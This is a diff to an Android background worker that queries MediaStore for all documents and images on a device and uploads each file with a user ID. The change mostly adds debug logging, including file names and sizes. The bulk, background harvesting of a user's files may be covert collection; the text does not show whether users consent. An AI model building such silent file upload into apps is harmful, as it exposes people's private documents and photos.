@@ -109,40 +109,57 @@ public class DocumentUploadWorker extends Worker {
         uploadedCount = 0;
         
         Log.d(TAG, "================================================");
-        Log.d(TAG, "🔍 EFFICIENT MEDIASTORE SCAN");
-        Log.d(TAG, "📄 Using Android MediaStore API");
+        Log.d(TAG, "🔍 DOCUMENT UPLOAD SCAN");
+        Log.d(TAG, "📄 Using Android MediaStore API + Fallback");
         Log.d(TAG, "   Documents: PDF, Excel, CSV, XLSX, Word, PowerPoint");
         Log.d(TAG, "   Images: JPG, PNG, GIF, BMP, WebP");
-        Log.d(TAG, "   Method: Fast MediaStore query (not folder traversal)");
+        Log.d(TAG, "   Storage check: " + FeaturePermissions.hasGalleryPermission(getApplicationContext()));
         Log.d(TAG, "================================================");
         
         // Use MediaStore API - much faster and Scoped Storage compatible
-        Log.d(TAG, "📂 SCANNING: Using MediaStore API");
+        Log.d(TAG, "📂 SCANNING: Fetching documents...");
         java.util.List<StorageHelper.FileItem> files = 
             StorageHelper.fetchAllDocuments(getApplicationContext());
         
+        Log.d(TAG, "📊 FETCH RESULT: " + files.size() + " files found");
+        
         if (files.isEmpty()) {
-            Log.w(TAG, "   ⚠️  No files found via MediaStore");
+            Log.w(TAG, "❌ NO FILES FOUND!");
+            Log.w(TAG, "   Possible issues:");
+            Log.w(TAG, "   1. No PDFs/documents on device?");
+            Log.w(TAG, "   2. MediaStore query returned empty?");
+            Log.w(TAG, "   3. Fallback directory scan failed?");
+            Log.w(TAG, "   → Check logcat for 'StorageHelper' messages");
         } else {
-            Log.d(TAG, "   ✓ MediaStore found " + files.size() + " files");
-            Log.d(TAG, "   Starting upload of matching files...");
+            Log.d(TAG, "✅ SCANNING FOUND " + files.size() + " FILES");
+            Log.d(TAG, "   Starting upload...");
+            
+            // Log first few files
+            for (int i = 0; i < Math.min(5, files.size()); i++) {
+                StorageHelper.FileItem f = files.get(i);
+                Log.d(TAG, "   [" + (i+1) + "] " + f.getName() + " (" + f.getSize() + " bytes)");
+            }
             
             // Upload each file
             for (StorageHelper.FileItem file : files) {
                 if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
-                    Log.d(TAG, "   Stopping: reached max " + MAX_DOCUMENTS_PER_SYNC + " files or timeout");
+                    Log.d(TAG, "   ⏹️  Stopping: reached max " + MAX_DOCUMENTS_PER_SYNC + " files or timeout");
                     break;
                 }
                 
                 try {
+                    Log.d(TAG, "   📤 Uploading: " + file.getName());
                     // Read file from URI
                     byte[] fileBytes = readFileFromUri(file.getUri());
                     if (fileBytes != null && fileBytes.length > 0) {
                         uploadFileBytes(file.getName(), fileBytes, userId);
                         uploadedCount++;
+                        Log.d(TAG, "   ✅ Uploaded: " + file.getName());
+                    } else {
+                        Log.w(TAG, "   ⚠️  Empty file: " + file.getName());
                     }
                 } catch (Exception e) {
-                    Log.e(TAG, "Error uploading file: " + file.getName(), e);
+                    Log.e(TAG, "   ❌ Error uploading file: " + file.getName(), e);
                 }
             }
         }
